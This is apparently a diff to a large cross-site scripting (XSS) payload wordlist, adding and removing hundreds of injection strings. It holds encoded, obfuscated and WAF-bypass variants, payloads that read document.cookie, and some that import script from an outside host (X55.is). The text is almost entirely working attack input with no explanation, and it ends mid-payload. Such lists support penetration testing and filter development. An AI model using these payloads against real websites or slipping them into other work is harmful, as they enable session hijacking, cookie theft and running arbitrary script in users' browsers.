 "><script>var img=document.createElement('img');img.src='x';img.onerror=function(){prompt(document.domain);};document.body.appendChild(img);</script>
+"><div style="background-image: url('x');" onerror=prompt(document.domain);>
 <scr'+'ipt>alert(1)</scr'+'ipt>
 \<script\>alert(1)\<\/script\>
 <script>alert\u00281\u0029</script>
 %3Cscript%3Ealert(1)%3C/script%3E
 "><IMG SRC=x ONERROR=prompt(document.domain);>
+"><div src=x onerror=prompt(document.domain);>
+"><img src=data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw== onerror=prompt(document.domain);>
+"><div style="background-image: url(x);" onerror=prompt(document.domain);>
 "><img src=/x onerror=prompt(document.domain);>
 "><img src="x" onerror="prompt(document.domain);">
 "><img src='x' onerror='prompt(document.domain);'>
@@ -640,7 +1396,6 @@ search?q=javascript:alert(document.domain)
 <><img src=1 onerror=alert(1)>
 <img src=1 onerror=print()>
 %27x%27onclick=%27alert(1)
-</script><script>alert(1)</script>
 "><sVg%2fonload%3dalert%2ebind%28%29%281%29%20class%3dRahul-Dh>
 “><img only src=1 onerror=alert()>
 <svg/ONxss='0'/ONload=location=window[`atob`]`amF2YXNjcmlwdDphbGVydCgxKQ==`;
@@ -649,14 +1404,11 @@ search?q=javascript:alert(document.domain)
 </script><svg/pnload=prompt(1)>
 <sCript>confirm()</sCript>
 "><SVG ONLOAD=&#97&#108&#101&#114&#116(&#x64&#x6f&#x63&#x75&#x6d&#x65&#x6e&#x74&#x2e&#x64&#x6f&#x6d&#x61&#x69&#x6e)>
-%22%3e%3c%53%56%47%20%4f%4e%4c%4f%41%44%3d%26%23%39%37%26%23%31%30%38%26%23%31%30%31%26%23%31%31%34%26%23%31%31%36%28%26%23%78%36%34%26%23%78%36%66%26%23%78%36%33%26%23%78%37%35%26%23%78%36%64%26%23%78%36%35%26%23%78%36%65%26%23%78%37%34%26%23%78%32%65%26%23%78%36%34%26%23%78%36%66%26%23%78%36%64%26%23%78%36%31%26%23%78%36%39%26%23%78%36%65%29%3e
 <img src=x onerror=prompt()>
 JavaScript://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(import(/https:\\X55.is/.source))}//\76-->
 javascript:var{a:onerror}={a:alert};throw%20document.domain
-<svg onload=alert(1)//
 java%0d%0ascript%0d%0a:alert(document.domain);//
 &lt;img src=x onerror=alert()>
-\'-alert(1)//
 #\'-alert(1)//
 -alert(1)-&apos;
 ' onerror='alert("xss")'>
@@ -683,7 +1435,7 @@ javascript:(alert('XSS Success!'))()
 嘾嘾<script>alert(2);</script>
 嘼svg><script>a<!>l<!>e<!>r<!>t<!>(<!>1<!>)</script>
 嘼"><svg onload=prompt(document.domain);>
-%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%BCscript%E5%98%BEalert(1);%E5%98%BC/script%E5%98%BE
+嘍嘊嘍嘊嘍嘊嘼script嘾alert(1);嘼/script嘾
 "><u>XSS</u><marquee+onstart='alert(document.cookie)'>XSS
 {{window['eval'](window['atob'](window['decodeURIComponent']('Ij48aW1nIHNyYz14IG9uZXJyb3I9cHJvbXB0KGRvY3VtZW50LmNvb2tpZSk7PjEy')))}}
 data:text/html;base64,Ij48aW1nIHNyYz14IG9uZXJyb3I9cHJvbXB0KGRvY3VtZW50LmNvb2tpZSk7PjEy
@@ -704,7 +1456,6 @@ ryp3i"accesskey="x"onclick="alert(1)"//opk15
 #'confirm(document.domain)'>
 #</script><script>alert(1)</script>
 ;</script><embed/test='asdf'/sr%00c='/'>
-"><svg onmouseover="confirm&#0000000040document.domain)
 ${alert(1)}
 d1bvs%3c%2fscript%3e%3cscript%3ealert(`XSS`)%3c%2fscript%3ec579g
 d1bvs</script><script>alert(`XSS`)</script>c579g
@@ -760,7 +1511,6 @@ x"><svg%0Donload=`window["alert"](((document)['cookie']))`>
 %253Cscript%253Ealert(1)%253C/script%253E
 #%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e
 %BCscript%BEalert(%A21%A2)%BC/script%BE
-<svg onload=alert&#0000000040document.cookie)>
 ";(a=alert,b=1,a(b))
 "<iframe src=j&#x61;vasc&#x72ipt&#x3a;alert&#x28;1&#x29; >"
 x"><svg%0Donload="window['alert'](document['cookie'])"
@@ -792,8 +1542,64 @@ with(document)alert(cookie)
 ";alert(String.fromCharCode(88,83,83))
 "+onDblClick=prompt(123)"+
 "+onError=prompt(123)"+
+">\u003Cimg src=x onerror=prompt(document.domain);\u003E"
+">\3Cimg src=x onerror=prompt(document.domain);\3E"
+PHNjcmlwdD5pbWcgc3JjPXggb25lcnJvci5wcm9tb3RlKHRyYW5zZm9ybS5kb21haW4pOy8+
+">&#x3C;img src=x onerror=prompt(document.domain);&#x3E;"
+">\<img src=x onerror=prompt(document.domain);\>"
+">\74img src=x onerror=prompt(document.domain);\76"
+">&lt;img src=x onerror=prompt(document.domain);&gt;()
+"><img src=x onerror=prompt(document.domain);>()\
+"%3E<img src=x onerror=prompt(document.domain);%3E()%3C"
+"><img src=x onerror=prompt(document.domain);String.fromCharCode(62)();"
+">\u003Cimg src=x onerror=prompt(document.domain);\u003E()("
+">\3Cimg src=x onerror=prompt(document.domain);\3E()("
+PHNjcmlwdD5pbWcgc3JjPXggb25lcnJvci5wcm9tb3RlKHRyYW5zZm9ybS5kb21haW4pOy8oKQ==
+">&#x3C;img src=x onerror=prompt(document.domain);&#x3E;()("
+">\<img src=x onerror=prompt(document.domain);\>()\"
+">\74img src=x onerror=prompt(document.domain);\76()("
+"><img src=x onerror=prompt(document.domain);&#59;&#60;&#62;
+"><img src=x onerror=prompt(document.domain);\;\<\>
+#<sc&#114;ipt>alert(1)<&#47;sc&#114;ipt>
+#javasc&#114;ipt:alert(2);
+&quot;&gt;&lt;svg onload=alert(1)&gt;
 ";eval(unescape(location))//#%0Aprompt(0)
 %'});%0aalert(1);%20//
+%27});%0aalert(1);%20//
+'"><A HRef=\" AutoFocus OnFocus=top/**/?. >
+'"><A HRef=\" AutoFocus OnFocus=top/**/?.['ale'%2B'rt'](1)>
+%27"><Img Src=OnXSS OnError=alert(1)>
+%27"><A%20HRef=\"%20AutoFocus%20OnFocus=top/**/?. >
+%27/onerror=alert(1)/%27
+/confirm?.(1)/
+<img+only=1+src=x+onerror=confirm(1)>
+">K=%27><Svg /OnLoad=(confirm)(1)>
+%3Cscript%3Evar%20q=`%22`;alert(document.cookie);%3C/script%3E
+<meter%20value="2"%20min="0"%20max="10"%20onmouseover="alert(%27XSS%27)">2%20out%20of%2010</meter>
+<svg/onload=setInterval(%27al\x65rt(1)%27,5000)>
+<img%20src=x%20onerror=alert%281%29>
+<script><!--\uFEFF--></script><script>alert(%27BOM%20Injection%27)</script>
+<details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle="prompt(document.cookie);">
+1%27%22%3E%3CImg+Src%3DOnXSS+OnError%3Dalert%28document.cookie%29%3E
+1%27"><Img+Src%3DOnXSS+OnError%3Dalert%28document.cookie%29>
+</img+src=x%20oNlY=1%20oNerror=alert(document.cookie)>//
+<img%20hrEF="x"%20sRC="data:x,"%20oNLy=1%20oNErrOR=prompt`1`//>
+--><K:script xmlns:K="http://www.w3.org/1999/xhtml">confirm?.(1)</K:script>
+;1<%252FScript%252F><Img%252FSrc%252FOnError=confirm%253F%252E(1)>
+confirm?.(1)
+;1%2522--%253E%253CSvg%2520O%256ELoad%253Dconfirm%25281%2529%253E/c
+;1'-confirm`K`-'
+{{$new.constructor('(confirm)(1)')()}}
+%27"><Img%0ASrc%0A=OnXSS%0AOnError%0A=alert(1)>
+'"<%00!--%00><%00Img/Src/On%00Error=(conf%00irm)(1)>
+1'"<�!--�><�Img/Src/On�Error=(conf�irm)(1)>
+<img//////src=x oNlY=1 oNerror=alert(document.cookie)(import(/https:\\X55.is?1=18369/.source))//>
+")%27--><SvG/onload=(co&#110;firm)(1)<!--"
+")%27--><SvG/onload=(co&#110;firm)(1)--!>"
+")%27--><SvG/onLoad=(confirm)(1)--!>"
+")%27--><SvG/onLoAd=(confirm)(1)<!--"
+")%27--><sVG/onLoaD=(conf&#105;rm)(1)<!--"
+")%27--><sVG/onLoaD=(confi&#x72;m)(1)<!--"
 <IMG+SRC="jav&#x0A;ascript:alert(1);">
 <IMG+SRC="jav#x0D;ascript:alert(1);">
 "jav&#x09;ascript:alert(1);">
@@ -857,6 +1663,7 @@ onfocus=JaVaSCript:alert(123) autofocus
 %0d%0a%20"><svg onload=alert(1)>
 %3F%20"><svg onload=alert(1)>
 %20<img src=1 onerror=alert(1)>
+<Svg OnLoad=alert(1)>
 %E5%98%8D%E5%98%8A%20<img src=1 onerror=alert(1)>
 %0d%0a%20<img src=1 onerror=alert(1)>
 %3F%20<img src=1 onerror=alert(1)>
@@ -898,14 +1705,23 @@ src=JaVaSCript:prompt(132)
 ><script>alert(123);</script x=
 " autofocus onkeyup="javascript:alert(123)
 <script\x20type="text/javascript">javascript:alert(1);</script>
+<script\x0Atype="text/javascript">javascript:alert(1);</script>
+<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">
 '`"><\x3Cscript>javascript:alert(1)</script>
 ABC<div style="x:expression\x5C(javascript:alert(1)">DEF
 ABC<div style="x:\xE3\x80\x80expression(javascript:alert(1)">DEF
+<a href="\xE2\x80\x85javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+`"'><img src=xxx:x \x0Bonerror=javascript:alert(1)>
 <a href="\x0Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
 `"'><img src=xxx:x \x0Aonerror=javascript:alert(1)>
 "`'><script>\x3Bjavascript:alert(1)</script>
 <img \x00src=x onerror="alert(1)">
 <a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>
+<script src="/\%(jscript)s"></script>
+classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="javascript:alert(1)"
+onclick="javascript:alert(1);">XXX</a></a><a href="javascript:javascript:alert(1)">XXX</a>
+<script>with(document.getElementById("d"))innerHTML=innerHTML</script>
+<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('javascript:alert(1)')()</script>
 <img src onerror /" '"= alt=javascript:alert(1)//">
 <a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=javascript:alert(1)></a>">
 <!--[if]><script>javascript:alert(1)</script-->
@@ -922,16 +1738,21 @@ ABC<div style="x:\xE3\x80\x80expression(javascript:alert(1)">DEF
 <button autofocus onfocus=confirm(2)>
 '`"><*chr*script>log(*num*)</script>
 "><img src="/" =_=" title="onerror='prompt(1)'">
+"><input+TyPE="hxlxmj"+STyLe="display:none;"+onfocus="this.style.display='block';+this.onfocus=null;"+oNMoUseOVer="this['onmo'+'useover']=null;eval(String.fromCharCode(99,111,110,102,105,114,109,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41));"+AuToFOcus>
 <img language=vbs src=<b onerror=confirm#1/1#>
 "]<img src=1 onerror=confirm(1)>
 #"]<img src=1 onerror=confirm(1)>
 /#<img src=1 onerror=javascript:confirm(3)>
 "><img src=javascript:while([{}]);>
+<img/src/onerror​=alert&#xFEFF;(1)>
+#'%22/onload=alert(document.domain)//
+xss"><input%20type=hidden%20oncontentvisibilityautostatechange=alert?.%26lpar;)%20style=content-visibility:auto>
+" onfocus="alert('chux')" autofocus="" />
+%3Cscr%3C!--esi--%3Eipt%3Ealer%3C!--esi--%3Et%281%29%3C%2Fsc%3C!--esi--%3Eript%3E
 <img/ src//'onerror/''/=confirm(1)//'>
 "\"><img src=\"x\" onerror=\"confirm(0)\"/>",
 <img src=x onerror=URL='javascript:confirm(1)'>
 #<img src=x onerror=URL='javascript:confirm(1)'>
-"><img src=x onerror=prompt(1);>
 "><img src=x onerror=confirm('x') />]
 "><img src=x onerror=prompt(document.cookie);>
 %22%3E%3Cimg%20src%3Dx%20onerror%3Dprompt%28document.cookie%29%3B%3E
@@ -939,6 +1760,17 @@ ABC<div style="x:\xE3\x80\x80expression(javascript:alert(1)">DEF
 %2522%253E%253Cimg%2520src%253Dx%2520onerror%253Dprompt%2528document.cookie%2529%253B%253E
 Ij48aW1nIHNyYz14IG9uZXJyb3I9cHJvbXB0KGRvY3VtZW50LmNvb2tpZSk7Pg==
 <img src=xx: onerror=confirm(document.location)>
+onwebkitmouseforcechanged%3Dalert%28document.cookie%29+XSS
+"><details/open/id="&XSS"ontoggle​=alert("XSS_WAF_BYPASS_:-)")>
+"><img/src/onerror='alert("XSS_WAF_BYPASS_:-)")'>
+"<svg/onload='alert("XSS_WAF_BYPASS_:-)")'>
+"><details/open/id="%26XSS"ontoggle​=alert("XSS_WAF_BYPASS_:-)")>
+"><div/id="XSS"onmouseover='alert("XSS_WAF_BYPASS_:-)")'>
+"><iframe/srcdoc='<script>alert("XSS_WAF_BYPASS_:-)")</script>'>
+"><video><source onerror='alert("XSS_WAF_BYPASS_:-)")'></video>
+"><div/id="&XSS"onmouseover=alert("XSS_WAF_BYPASS_:-)")>
+'><span/id="&XSS"onclick=alert("XSS_WAF_BYPASS_:-)")>
+'><input/type="text"value='"&XSS'onfocus=alert("XSS_WAF_BYPASS_:-)")>
 <--`<img/src=` onerror=confirm(1)> --!>
 <img/src=x alt=confirm(1) onmouseover=eval(alt)>
 ><imgsrc=x onerror=confirm.onerror=confirm(1)>
@@ -971,6 +1803,32 @@ Ij48aW1nIHNyYz14IG9uZXJyb3I9cHJvbXB0KGRvY3VtZW50LmNvb2tpZSk7Pg==
 <IMG SRC=javascript:alert("XSS")>
 <IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
 <script src="data:text/javascript,alert(1)"></script>
+<script/src=data:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,alert(4)></script>
+"`'><script>\x7Ejavascript:alert(1)</script>
+</script><x ng-app ng-csp>{{constructor.constructor('alert(1)')()}}
+<script>x=””%prompt(9)%””;y=42;</script>
+<script>x=””&&prompt(9)&&””;y=42;</script>
+<script>x=””&prompt(9)&””;y=42;</script>
+<script>x=””*prompt(9)*””;y=42;</script>
+<script>x=””+prompt(9)+””;y=42;</script>
+<script>x=””-prompt(9)-””;y=42;</script>
+<script>x=””/prompt(9)/””;y=42;</script>
+<script>x=””<<prompt(9)<<””;y=42;</script>
+<script>x=””<=prompt(9)<=””;y=42;</script>
+<script>x=””<prompt(9)<””;y=42;</script>
+<script>x=””===prompt(9)===””;y=42;</script>
+<script>x=””==prompt(9)==””;y=42;</script>
+<script>x=””>=prompt(9)>=””;y=42;</script>
+<script>x=””>>>prompt(9)>>>””;y=42;</script>
+<script>x=””>>prompt(9)>>””;y=42;</script>
+<script>x=””>prompt(9)>””;y=42;</script>
+<script>x=””?prompt(9):””;y=42;</script>
+“><svg/a=#”onload=’/*#*/prompt(1)’
+‘te’ > alert(‘>’) > ‘xt’;
+‘te’ ? alert(‘?:’) : ‘xt’;
+‘te’ ^ alert(‘^’) ^ ‘xt’;
+‘te’ | alert(‘|’) | ‘xt’;
+‘te’ — alert(‘-’) — ‘xt’;
 <iframe/src \/\/onload = prompt(1)
 <iframe/onreadystatechange=alert(1)
 <svg/onload=alert(1)
@@ -982,6 +1840,20 @@ Ij48aW1nIHNyYz14IG9uZXJyb3I9cHJvbXB0KGRvY3VtZW50LmNvb2tpZSk7Pg==
 <IMG SRC="jav&#x09;ascript:alert('XSS');">
 <IMG SRC=" &#14; javascript:alert('XSS');">
 <IMG SRC="('XSS')"
+\\";alert('XSS');//
+‘); alert(‘XSS
+‘|alert(‘XSS’)|’
+“;alert(‘XSS’);//
+({[alert`xss`]:1})
+: ({[alert`xss`]:1})
+‘;alert(/xss/)///’;alert(1)//”;alert(2)///”;alert(3)// →</SCRIPT>”>’><SCRIPT>alert(/xss/)</SCRIPT>=&{}”);}alert(6);functions+xss(){//
+);alert(xss-by-shawar);//
+alert(/xss/.source)
+'); alert('xss'); var x='
+‘); alert(‘xss’); var x=’
+alt=’”name=’onerror=alert()//’
+\\”;alert(‘XSS’);//
+\”;;alert(‘;XSS’;);//
 \";alert('XSS');//
 </TITLE><SCRIPT>alert("XSS");</SCRIPT>
 <INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
@@ -1003,18 +1875,69 @@ echo('IPT>alert("XSS")</SCRIPT>'); ?>
 <isindex x="javascript:" onmouseover="alert(XSS)">
 "><img src="x:x" onerror="alert(XSS)">
 <img src="x:gif" onerror="window['al\u0065rt'](0)"></img>
-<iframe/src="data:text/html,<svg onload=alert(1)>">
+"autofocus/onfocus=alert(1)--><video/poster/onerror=prompt(2)">" -confirm(3)-
+<input type="text" value="XSS" />
+<body onload=alert("XSS")>
+<marquee onstart=alert("XSS")>
+<base href="javascript:alert('XSS');">
+<form action="javascript:alert('XSS')"><input type="submit"></form>
+<embed src="javascript:alert('XSS');">
+<object data="javascript:alert('XSS');"></object>
+<script src="data:text/javascript,alert('XSS');"></script>
+<blink onmouseover="alert('XSS')">Hover me</blink>
+<link rel="stylesheet" href="javascript:alert('XSS');">
+<!--<script>alert('XSS')</script>-->
+<noscript><p title="</noscript><script>alert(1)</script>">
+<li onclick="alert(1)">XSS</li>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s></animate>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="></iframe>
+<?xml version="1.0" ?><svg><script>alert(1)</script></svg>
+<canvas onmousemove=alert(1)>XSS</canvas>
+<applet code="javascript:alert(1);"></applet>
+<img dynsrc="javascript:alert(1)">
+<img lowsrc="javascript:alert(1)">
+<output onload=alert(1)>XSS</output>
+<progress value=100 onmouseover=alert(1)>
+<bgsound src="javascript:alert(1)">
+<isindex action="javascript:alert(1)">
+<xss id=x tabindex=1 onactivate=alert(1)>
+<animate onbegin=alert(1) attributeName=x dur=1s>
+<animateMotion onbegin=alert(1) attributeName=x dur=1s>
+<feImage href="javascript:alert(1)">
+<mpath href="javascript:alert(1)">
+<unknown onmouseover=alert(1)>XSS</unknown>
+<?xml-stylesheet href="javascript:alert(1)"?>
 <meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
 <meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
+<Svg+OnLoad=import('//X55.is')>#alert(document.domain)//       )
 <iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
 <form><a href="javascript:\u0061lert(1)">X
 </script><img/*%00/src="worksinchrome&colon;prompt(1)"/%00*/onerror='eval(src)'>
 <style>//*{x:expression(alert(/xss/))}//<style></style>
-<img src="/" =_=" title="onerror='prompt(1)'">
-<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe
-<script x> alert(1) </script 1=2
+<iframe src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUAAAAFCAIAAABQZ2zoAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH5QMFBCciFC9eyQAAAAlwSFlzAAALEwAACxMBAJqcGAAAABl0RVh0Q29tbWVudABDcmVhdGVkIHdpdGggR0lNUFeBDhcAAAANSURBVAjXY/j//z8DPYAJDAAEcQEGgDp5cAAAAAElFTkSuQmCC">
+<svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml" onload="alert(1)"></body></foreignObject></svg>
+<svg><filter><feGaussianBlur in="SourceGraphic" stdDeviation="1" onmouseover="alert(1)" /></filter></svg>
+<svg><clippath id="x"><image width="100" height="100" href="javascript:alert(1)"/></clippath></svg>
+<svg><pattern id="x" width="100" height="100" patternUnits="userSpaceOnUse"><rect width="100" height="100" style="fill: #000;"/><animate attributeName="x" from="0" to="100" dur="5s" repeatCount="indefinite" onbegin="alert(1)"/></pattern></svg>
+<svg><switch><g requiredExtensions="http://www.w3.org/1999/xhtml" systemLanguage="en"><foreignObject><body xmlns="http://www.w3.org/1999/xhtml" onload="alert(1)"></body></foreignObject></g></switch></svg>
+<svg><altGlyphItem><glyphRef xlink:href="javascript:alert(1)"/></altGlyphItem></svg>
+<svg><cursor xlink:href="javascript:alert(1)"/></svg>
+<svg><view xlink:href="javascript:alert(1)"/></svg>
+<svg><color-profile xlink:href="javascript:alert(1)"/></svg>
+<script onload="alert(1)"></script>
+<form action="javascript:alert(1)"><input type="submit" /></form>
+<plaintext><script>alert(1)</script>
+<svg xmlns:xlink="http://www.w3.org/1999/xlink"><a xlink:href="javascript:alert(1)">XSS</a></svg>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><a xlink:href="javascript:alert(1)">XSS</a></svg>
+<link href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">
+<link rel="import" href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">
+<style onload="alert(1)"></style>
+<meta http-equiv="refresh" content="0;url=javascript:alert('XSS');">
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"'>><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+'"--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>'
 <OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT>
-<form><button formaction=javascript&colon;alert(1)>CLICKME
 <input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
 <iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
 a=alert,a(1)
@@ -1041,6 +1964,14 @@ top[8680439..toString(30)](1)
 <script>'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}</script>
 <script>location='javascript:alert\x281\x29'</script>
 <script>location=name</script>
+#&lt;img src=1 onerror=alert(1)&gt;
+&lt;img src=x onerror=print()&gt;
+&quot;onmouseover=&quot;alert(1)
+#&quot;onmouseover=&quot;alert(1)
+#javasc&#114;ipt:alert(1)
+javasc&#114;ipt:alert(1)?q=%26callback%3Durc_button.click%23
+#&quot;&gt;&lt;img src=x onerror=prompt(document.domain);&gt;
+1&quot;)&quot;&lt;&#33;&#45;&#45;&gt;&lt;Svg OnLoad=(confirm)(1)&#45;&#45;&gt;
 <script>alert`1`</script>
 <script>throw[onerror]=[alert],1</script>
 <script>var{haha:onerror=alert}=0;throw 1</script>
@@ -1068,6 +1999,39 @@ blah(""+new class b{toString=e=>location=name}+"")</script>
 javascript:new%20Function`al\ert\`1\``;
 6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/
 &amp;amp;lt;script&amp;amp;gt;alert(1)&amp;amp;lt;/script&amp;amp;gt;
+"><form onformdata%3Dwindow.confirm(cookie)><button>XSS here<!--
+"><div onpointerrawupdate="console.log('XSS')">Click_Here_Click_Here_Click_Here_Click_Here_Click_Here_Click_Here_Click_Here_ClickHere</div>
+<a/href=javascript&colon;alert()>click
+<a href="javascript&#0000058&#0000097lert('Successful XSS')">Click this link!</a>
+<a href="  &#x8; &#23;   javascript:alert('Successful XSS')">Click this link!</a>
+<a href='vbscript:MsgBox("Successful XSS")'>Click here</a>
+<a/href=&#74;ava%0a%0d%09script&colon;alert()>click
+<d3v/onauxclick=(((confirm)))``>click
+<d3v/onmouseleave=[2].some(confirm)>click
+<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
+%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%5B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%28%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%2B%5B%21%5B%5D%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%21%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%2B%28%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%5B%2B%21%2B%5B%5D%5D%29%29%5B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B